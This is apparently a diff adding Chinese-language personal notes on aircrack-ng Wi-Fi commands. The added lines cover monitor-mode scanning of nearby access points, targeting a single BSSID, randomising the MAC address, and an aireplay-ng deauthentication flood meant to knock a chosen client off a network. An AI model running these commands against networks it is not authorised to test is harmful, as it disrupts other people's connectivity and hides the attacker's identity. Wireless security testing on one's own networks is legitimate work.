@@ -18,3 +18,25 @@ airmon-ng stop wlan1mon
 # 好像没啥用
 service network-manager start
 
+# 扫描附近热点
+airodump-ng wlan0mon
+
+# 只扫描某一个热点，加上MAC地址
+airodump-ng --bssid MAC_ADDR wlan0mon
+airodump-ng --channel 13 --bssid MAC_ADDR wlan0mon
+
+# 停止wlan0
+ifconfig wlan0 down/up
+
+# 改MAC地址 -r 表示随机生成一个
+macchanger -r wlan0
+
+# 对某一主机断网
+aireplay-ng --deauth 2000 -a AP_MAC -c CLIENT_MAC wlan0mon
+
+
+
+
+
+、
+
